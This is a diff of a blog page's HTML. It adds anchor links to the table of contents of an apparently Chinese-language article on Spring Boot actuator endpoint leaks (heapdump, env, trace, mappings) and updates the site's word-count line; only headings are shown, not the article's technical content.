-			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link"><span class="toc-article-text">Spring Boot 端点Fuzz技巧</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link"><span class="toc-article-text">Spring Boot 端点敏感信息泄露</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-article-text">概述</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#trace-%E6%B3%84%E9%9C%B2%E7%94%A8%E6%88%B7%E8%AF%B7%E6%B1%82%E4%BF%A1%E6%81%AF"><span class="toc-article-text">trace 泄露用户请求信息</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#mappings-%E6%B3%84%E9%9C%B2%E8%B7%AF%E7%94%B1%E4%BF%A1%E6%81%AF"><span class="toc-article-text">mappings 泄露路由信息</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#heapdump-%E6%B3%84%E9%9C%B2%E5%A0%86%E6%A0%88%E4%BF%A1%E6%81%AF"><span class="toc-article-text">heapdump 泄露堆栈信息</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BD%BF%E7%94%A8Eclipse-Memory-Analyzer%E8%8E%B7%E5%8F%96"><span class="toc-article-text">使用Eclipse Memory Analyzer获取</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BD%BF%E7%94%A8Java-VisualVM%E8%8E%B7%E5%8F%96"><span class="toc-article-text">使用Java VisualVM获取</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BD%BF%E7%94%A8jhat%E8%8E%B7%E5%8F%96"><span class="toc-article-text">使用jhat获取</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BD%BF%E7%94%A8JDumpSpider%E8%8E%B7%E5%8F%96"><span class="toc-article-text">使用JDumpSpider获取</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BD%BF%E7%94%A8heapdump-tool%E8%8E%B7%E5%8F%96"><span class="toc-article-text">使用heapdump_tool获取</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#env-%E6%B3%84%E9%9C%B2%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF"><span class="toc-article-text">env 泄露配置信息</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%BB%95%E8%BF%87%E6%98%9F%E5%8F%B7%E8%84%B1%E6%95%8F"><span class="toc-article-text">绕过星号脱敏</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link"><span class="toc-article-text">漏洞检测与利用工具</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link"><span class="toc-article-text">鸣谢</span></a></li></ol>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Spring-Boot-%E7%AB%AF%E7%82%B9Fuzz%E6%8A%80%E5%B7%A7"><span class="toc-article-text">Spring Boot 端点Fuzz技巧</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Spring-Boot-%E7%AB%AF%E7%82%B9%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-article-text">Spring Boot 端点敏感信息泄露</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-article-text">概述</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#trace-%E6%B3%84%E9%9C%B2%E7%94%A8%E6%88%B7%E8%AF%B7%E6%B1%82%E4%BF%A1%E6%81%AF"><span class="toc-article-text">trace 泄露用户请求信息</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#mappings-%E6%B3%84%E9%9C%B2%E8%B7%AF%E7%94%B1%E4%BF%A1%E6%81%AF"><span class="toc-article-text">mappings 泄露路由信息</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#heapdump-%E6%B3%84%E9%9C%B2%E5%A0%86%E6%A0%88%E4%BF%A1%E6%81%AF"><span class="toc-article-text">heapdump 泄露堆栈信息</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BD%BF%E7%94%A8Eclipse-Memory-Analyzer%E8%8E%B7%E5%8F%96"><span class="toc-article-text">使用Eclipse Memory Analyzer获取</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BD%BF%E7%94%A8Java-VisualVM%E8%8E%B7%E5%8F%96"><span class="toc-article-text">使用Java VisualVM获取</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BD%BF%E7%94%A8jhat%E8%8E%B7%E5%8F%96"><span class="toc-article-text">使用jhat获取</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BD%BF%E7%94%A8JDumpSpider%E8%8E%B7%E5%8F%96"><span class="toc-article-text">使用JDumpSpider获取</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BD%BF%E7%94%A8heapdump-tool%E8%8E%B7%E5%8F%96"><span class="toc-article-text">使用heapdump_tool获取</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#env-%E6%B3%84%E9%9C%B2%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF"><span class="toc-article-text">env 泄露配置信息</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%BB%95%E8%BF%87%E6%98%9F%E5%8F%B7%E8%84%B1%E6%95%8F"><span class="toc-article-text">绕过星号脱敏</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7"><span class="toc-article-text">漏洞检测与利用工具</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E9%B8%A3%E8%B0%A2"><span class="toc-article-text">鸣谢</span></a></li></ol>
 		</div>
 	
 	</div>
@@ -753,7 +691,7 @@ var bszCaller,bszTag;!function(){var c,d,e,a=!1,b=[];ready=function(c){return a|
     setInterval("createtime()",250);
 </script>
 <br><br>
-<span class="num">及辞已经在本站记录了 179.1k 字</span>
+<span class="num">及辞已经在本站记录了 181k 字</span>
 <script>
   document.addEventListener("DOMContentLoaded", function() {
     fetch('/imageCount.json')
